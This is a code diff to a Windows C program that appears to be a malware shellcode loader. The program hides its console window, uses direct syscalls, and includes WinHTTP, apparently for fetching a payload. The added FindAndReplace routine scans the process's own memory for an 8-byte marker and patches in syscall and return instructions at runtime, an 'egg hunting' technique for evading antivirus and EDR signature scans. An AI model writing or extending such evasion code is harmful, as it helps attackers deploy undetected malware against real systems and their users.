@@ -1,6 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <winhttp.h>
+#include <psapi.h>
 #include "syscalls64.h"
 
 PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len)
@@ -20,9 +21,40 @@ PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len)
     return dest;
 }
 
+void FindAndReplace(unsigned char egg[], unsigned char replace[])
+{
+    HANDLE hProcess = GetCurrentProcess();
+    HMODULE lphModule;
+    DWORD lpcbNeeded;
+    MODULEINFO mi;
+    ULONG64 startAddress, size, currentOffset = 0;
+    unsigned char buffer[8];
+
+    EnumProcessModules(hProcess, &lphModule, sizeof(lphModule), &lpcbNeeded);
+    GetModuleInformation(hProcess, lphModule, &mi, sizeof(mi));
+
+    startAddress = (ULONG64)mi.lpBaseOfDll;
+    size = (ULONG64)mi.SizeOfImage;
+
+    while (currentOffset < size - 8)
+    {
+        LPVOID currentAddress = (LPVOID)(startAddress + currentOffset);
+        ReadProcessMemory(hProcess, currentAddress, buffer, 8, NULL);
+        if (memcmp(egg, buffer, 8) == 0)
+        {
+            WriteProcessMemory(hProcess, currentAddress, replace, 8, NULL);
+        }
+        currentOffset++;
+    }
+}
+
 int main()
 {
     ShowWindow(GetForegroundWindow(), SW_HIDE);
+    unsigned char egg[] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77};
+    unsigned char replace[] = {0x0f, 0x05, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC};
+    FindAndReplace(egg, replace);
+
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
     LPSTR pszOutBuffer;
